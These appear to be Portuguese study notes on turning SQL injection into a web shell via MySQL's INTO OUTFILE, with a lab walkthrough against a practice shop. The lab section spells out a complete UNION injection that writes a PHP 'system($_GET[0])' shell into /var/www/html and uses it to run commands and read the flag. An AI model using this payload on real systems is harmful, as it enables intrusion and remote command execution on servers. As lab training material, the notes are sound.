Utilizar do SQL para salvar algum valor em um arquivo na maquina que está hosteando o serviço de banco de dados, ou aplicação, e então conseguir acessar via url o arquivo, e então conseguir uma web shell

Para isso utilizamos a função into outfile, como por exemplo: select @@version into outfile "/tmp/version.txt" onde a versão do bd seria colocada em um arquivo version.txt na pasta tmp do servidor. Mas as vezes não temos permissões para fazer a criação do arquivo. 

into outfile, não consegue sobreescrever
into dumpfile, não processa caracteres especiais

pasta do apache: /var/www/html/ 

pasta do nginx:




<h1>Laboratório</h1> 
Nesse laboratório, temos a mesma loja do sql manual, ou seja, temos 4 colunas, e conseguimos fazer com que salvamos no /var/www/html, um arquivo, como ola.php, e na query temos, ' or 1=1 union select 1,2,3,"<?php system($_GET[0]);?>" into outfile "/var/www/html/ola.php", quando acessamos esse arquivo via url, e adicionamos um parametro 0, e igualamos a algum comando, podemos ver que ele responde corretamente, então já temos a webshell, com isso é só procurarmos a flag, e dar um cat nela.